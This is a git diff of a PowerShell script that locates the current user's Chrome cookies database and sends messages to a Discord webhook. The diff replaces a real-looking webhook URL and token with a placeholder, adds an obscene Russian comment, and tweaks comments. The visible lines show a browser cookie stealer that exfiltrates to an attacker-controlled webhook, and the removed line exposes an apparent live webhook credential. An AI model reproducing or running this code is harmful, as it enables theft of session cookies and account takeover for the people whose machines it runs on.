@@ -1,5 +1,7 @@
+# хуй хуй
+
 # Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1382033925676994591/fD2Tkr-ggL7QXrjiGs3phMu80IyTcQOPGUBstF4-vmDRVa9prGbeISQFqAGrnFmuq72a"
+$webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
 
 # Get the current user's username and construct the path to Chrome's cookies database
 $username = $env:USERNAME
@@ -50,14 +52,14 @@ if (Test-Path $chromePath) {
         Remove-Item -Path $outputFile
     }
     catch {
-        # Send error message to the webhook
+        # Send error message to the webhook with proper JSON formatting
         $errorMessage = "Error: " + $_.ToString()
         $jsonBody = @{content=$errorMessage} | ConvertTo-Json
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
     }
 }
 else {
-    # If the Cookies file is not found, send a message to the webhook
+    # If the Cookies file is not found, send a message to the webhook with proper JSON formatting
     $message = "Chrome cookies file not found for user $username"
     $jsonBody = @{content=$message} | ConvertTo-Json
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
